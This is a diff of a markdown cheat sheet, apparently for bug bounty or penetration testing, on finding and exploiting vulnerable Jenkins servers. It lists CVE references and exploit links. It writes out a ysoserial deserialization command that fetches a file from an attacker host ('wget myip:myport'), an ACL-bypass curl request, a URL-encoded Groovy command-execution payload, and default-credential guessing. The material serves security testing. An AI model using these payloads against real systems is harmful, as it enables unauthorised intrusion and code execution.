@@ -1,5 +1,18 @@
-## Jenkins
-1. Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
+# Jenkins Common Bugs
+
+## Introduction
+What would you do if you came across a website that uses Jenkins?
+
+## How to Detect
+Usually in the HTTP response there is a header like this `X-Jenkins`
+
+1. Find the related CVE by checking jenkins version
+* How to find the jenkins version
+
+By checking the response header `X-Jenkins`, sometimes the version is printed there. If you found outdated jenkins version, find the exploit at [pwn_jenkins](https://github.com/gquere/pwn_jenkins)
+
+Some example CVE:
+- Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 
 Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
 Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):
@@ -9,7 +22,7 @@ java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.s
 ./jenkins_rce.py jenkins_ip jenkins_port payload.out
 ```
 
-2. Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
+- Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
 
 Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).
 
@@ -18,13 +31,9 @@ If the Jenkins requests authentication but returns valid data using the followin
 curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
 ```
 
-3. Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)
-
-Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).
-
 Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).
 
-4. CVE-2019-1003030
+- CheckScript RCE in Jenkins (CVE-2019-1003030)
 
 How to Exploit:
 - [PacketStorm](https://packetstormsecurity.com/files/159603/Jenkins-2.63-Sandbox-Bypass.html)
@@ -56,11 +65,15 @@ to
 
 %70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%78%78%2e%78%78%2e%78%78%2e%78%78%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d
 
-5. Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
+2. Default Credentials
+```
+Try to login using admin as username and password
+```
 
-How to exploit:
-- [@jas502n](https://github.com/jas502n/CVE-2019-10392)
-- [iwantmore.pizza](https://iwantmore.pizza/posts/cve-2019-10392.html)
+3. Unauthenticated Jenkins Dashboard
+```
+Access https://target.com and if there is no login form then it is vulnerable
+```
 
-Reference: 
-- https://github.com/gquere/pwn_jenkins
+## Reference
+* [pwn_jenkins](https://github.com/gquere/pwn_jenkins)
